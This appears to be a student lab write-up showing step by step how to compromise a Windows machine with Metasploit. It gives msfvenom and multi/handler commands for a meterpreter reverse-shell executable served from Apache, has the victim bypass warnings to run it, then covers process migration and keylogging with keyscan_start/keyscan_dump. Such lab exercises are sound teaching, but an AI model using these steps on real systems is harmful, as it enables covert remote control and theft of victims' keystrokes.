# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
## PROGRAM:
Find the attackers ip address using ifconfig

## OUTPUT:
Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

![eth6 1](https://github.com/Rajeshanbu/Compromising-windows-using-Metasploit/assets/118924713/8ecf977c-b0c6-49ae-a262-7bc24363d6e7)


copy the fun.exe into the apache /var/www/html folder

![eth6 2](https://github.com/Rajeshanbu/Compromising-windows-using-Metasploit/assets/118924713/4795897a-a372-4048-b666-45247e682cc2)


Start apache server sudo systemctl apache2 start and Check the status of apache2

![eth6 3](https://github.com/Rajeshanbu/Compromising-windows-using-Metasploit/assets/118924713/8dbe85ae-e915-48c2-84ae-f8bf71bbd905)


## Invoke msfconsole:
## OUTPUT:

![ETH6 4](https://github.com/Rajeshanbu/Compromising-windows-using-Metasploit/assets/118924713/1474ebbc-8301-44ff-80cf-66ad2edf821b)


ype help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![eth6 5](https://github.com/Rajeshanbu/Compromising-windows-using-Metasploit/assets/118924713/6f628cc6-e641-432d-ac65-5542c491531b)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![eth6 6](https://github.com/Rajeshanbu/Compromising-windows-using-Metasploit/assets/118924713/c2145502-30e5-4871-99b4-5ba11e17dcbd)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit 

![eth6 7](https://github.com/Rajeshanbu/Compromising-windows-using-Metasploit/assets/118924713/31ffd713-1367-4817-b3ce-22922aebe550)


To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![eth6 8](https://github.com/Rajeshanbu/Compromising-windows-using-Metasploit/assets/118924713/13546c9d-1842-4afa-a408-7fbe1c41c03e)



keyscan_dump Shows the keystrokes captured so far

![275778840-2bb2a213-9dd6-4b39-b475-ba50b17a0e4e](https://github.com/Rajeshanbu/Compromising-windows-using-Metasploit/assets/118924713/38dd2fcf-baff-411c-b9fd-16d037d13e74)



## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
